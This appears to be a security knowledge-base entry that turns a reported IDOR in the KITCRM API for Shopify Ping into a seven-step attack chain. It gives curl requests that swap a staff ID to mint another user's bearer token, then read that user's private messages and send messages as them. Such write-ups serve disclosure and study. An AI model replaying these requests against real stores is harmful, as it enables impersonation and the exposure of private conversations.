---
tags:
  - idor
  - authorization-bypass
  - token-impersonation
  - shopify
  - kitcrm
type: attack_chain
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Lateral Movement]]'
commands:
  - '[[commands/post-shopify-xauth-login]]'
  - '[[commands/post-kitcrm-arro-token-idor]]'
  - '[[commands/get-kitcrm-messages]]'
  - '[[commands/post-kitcrm-send-message]]'
platforms:
  - Web
complexity: medium
procedures:
  - '[[procedures/Setup-High-Priv-Conversation]]'
  - '[[procedures/Create-Low-Priv-User]]'
  - '[[procedures/Obtain-Low-Priv-Access-Token]]'
  - '[[procedures/Exploit-IDOR-for-High-Priv-Token]]'
  - '[[procedures/Read-High-Priv-Messages]]'
  - '[[procedures/Send-Messages-as-High-Priv-User]]'
step_count: 7
techniques:
  - '[[Valid Accounts]]'
description: >-
  A low-privileged user exploits an IDOR vulnerability in the KITCRM API to
  generate authorization tokens for high-privileged users, enabling reading of
  private conversations and sending instructions on their behalf.
skill_level: intermediate
impact_level: high
id: 72c52aeb-6981-43d5-a1fc-931706d7af87
created_at: '2025-12-14T17:29:57.285Z'
updated_at: '2025-12-14T17:29:57.285Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Lateral Movement]]'
mitre_techniques:
  - '[[Valid Accounts]]'
---
# IDOR in KITCRM API Allowing Low-Priv User to Impersonate High-Priv User via Shopify Ping Tokens

## Overview

This attack chain exploits an Insecure Direct Object Reference (IDOR) vulnerability in the KITCRM API integrated with Shopify Ping. A low-privileged user can use their Shopify Ping access token to generate KITCRM authorization tokens for any high-privileged staff member by manipulating the 'id' parameter in the /api/v1/arro_token endpoint. This allows the attacker to read the high-privileged user's private conversations with KIT and send new instructions impersonating them, bypassing access controls and complicating attribution. The vulnerability stems from insufficient authorization checks, permitting token creation for arbitrary user IDs.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 7 |
| Execution Time | ~15 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Setup High-Priv Access] --> B[Create Low-Priv User]
    B --> C[Obtain Low-Priv Token]
    C --> D[Exploit IDOR for High-Priv Token]
    D --> E[Read Messages]
    E --> F[Send Impersonated Messages]
    F --> G[Objective: Privilege Escalation]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#f39c12
    style D fill:#3498db
    style E fill:#9b59b6
    style F fill:#9b59b6
    style G fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/Burp-Suite]]

### Target Environment

- Web platform with Shopify Ping and KITCRM API access
- Required services: Shopify Admin API, KITCRM API (www.kitcrm.com)
- Network access: Internet connectivity to myshopify.com and kitcrm.com

### Initial Access Requirements

- Access to a Shopify test account with admin privileges to create users
- High-privileged user credentials for initial setup
- Low-privileged user credentials (minimal staff permissions)

## Detailed Attack Procedures

### Step 1: Setup High-Priv Conversation
procedure: [[procedures/Setup-High-Priv-Conversation]]

**Objective**: Establish conversation history for the high-privileged user in Shopify Ping to enable later reading.

**Instructions**: Log in to the Shopify Ping application using high-privileged user credentials and interact with KIT by sending sample messages.

**Expected Output**: Conversation history created in KITCRM for the high-privileged user.

**Success Indicators**:
- Successful login and chat interaction confirmed in the app
- No errors in KIT responses

### Step 2: Create Low-Priv User
procedure: [[procedures/Create-Low-Priv-User]]

**Objective**: Add a low-privileged staff member to the Shopify account with minimal permissions.

**Instructions**: Use the Shopify admin panel to create or assign a new staff member with no access to Shopify Ping or limited permissions.

**Expected Output**: Low-privileged user account created and confirmed.

**Success Indicators**:
- User added in Shopify staff list
- User has no Ping access by default

### Step 3: Obtain Low-Priv Access Token
procedure: [[procedures/Obtain-Low-Priv-Access-Token]]

**Objective**: Generate a Shopify Ping access token for the low-privileged user via the login API.

**Instructions**: Execute [[commands/post-shopify-xauth-login]] with low-privileged credentials to obtain the access_token.

```bash
curl -X POST https://alwayzhack.myshopify.com/admin/api/xauth \
  -H "Content-Type: application/json" \
  -d '{"email":"lowpriv@example.com","password":"password"}'
```

**Expected Output**: JSON response containing the access_token for low-privileged user.

**Success Indicators**:
- Valid access_token received
- Token can be used in subsequent API calls

### Step 4: Exploit IDOR for High-Priv Token
procedure: [[procedures/Exploit-IDOR-for-High-Priv-Token]]

**Objective**: Use the low-privileged token to generate a KITCRM authorization token for the high-privileged user via IDOR.

**Instructions**: Intercept the request in Burp Suite and modify the 'id' parameter to the high-privileged staff ID, then execute [[commands/post-kitcrm-arro-token-idor]].

```bash
curl -X POST "https://www.kitcrm.com/api/v1/arro_token?access_token=LOW_PRIV_TOKEN&myshopify_domain=alwayzhack.myshopify.com&id=42668326968" \
  -H "Content-Type: application/json" \
  -H "User-Agent: Shopify Ping/iOS/2.5.4 (iPhone12,3/com.shopify.ping/13.1.1) - Build 3006"
```

**Expected Output**: Response containing the Bearer token for the high-privileged user.

**Success Indicators**:
- High-priv KITCRM token obtained
- No authorization error in response

### Step 5: Read High-Priv Messages
procedure: [[procedures/Read-High-Priv-Messages]]

**Objective**: Use the stolen KITCRM token to retrieve the high-privileged user's conversation history.

**Instructions**: Execute [[commands/get-kitcrm-messages]] with the high-priv token in the Authorization header.

```bash
curl -X GET "https://www.kitcrm.com/api/v2/messages" \
  -H "Authorization: Bearer HIGH_PRIV_TOKEN" \
  -H "User-Agent: Shopify Ping/2.5.4 (com.shopify.ping; build:3006; iOS 13.1.1) Alamofire/4.8.2"
```

**Expected Output**: JSON array of messages from the high-privileged user's KIT conversations.

**Success Indicators**:
- Private messages visible
- Conversation history matches setup

### Step 6: Send Messages as High-Priv User
procedure: [[procedures/Send-Messages-as-High-Priv-User]]

**Objective**: Impersonate the high-privileged user by sending new instructions to KIT.

**Instructions**: Execute [[commands/post-kitcrm-send-message]] with the high-priv token and a test message.

```bash
curl -X POST "https://www.kitcrm.com/api/v2/messages" \
  -H "Authorization: Bearer HIGH_PRIV_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"incoming_message": "testtesthai"}'
```

**Expected Output**: Confirmation of message sent or executed by KIT.

**Success Indicators**:
- Message appears in conversation
- KIT processes the instruction as from high-priv user

### Step 7: Validate Impact

**Objective**: Confirm the full privilege escalation and attribution bypass.

**Instructions**: Review the read messages and sent instructions to ensure they are attributed to the high-privileged user, not the attacker.

**Expected Output**: Evidence of impersonation without detection.

**Success Indicators**:
- Low-priv user actions indistinguishable from high-priv
- Access to sensitive KIT interactions

## Attack Chain Summary

### Key Achievements

1. Generated high-privileged KITCRM token using low-privileged access
2. Read private KIT conversations
3. Sent impersonated instructions to KIT
4. Bypassed Shopify Ping access controls via IDOR

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Valid Accounts]]

### MITRE ATT&CK Tactics

- [[Lateral Movement]]

---
*Last updated: 2023-10-01*
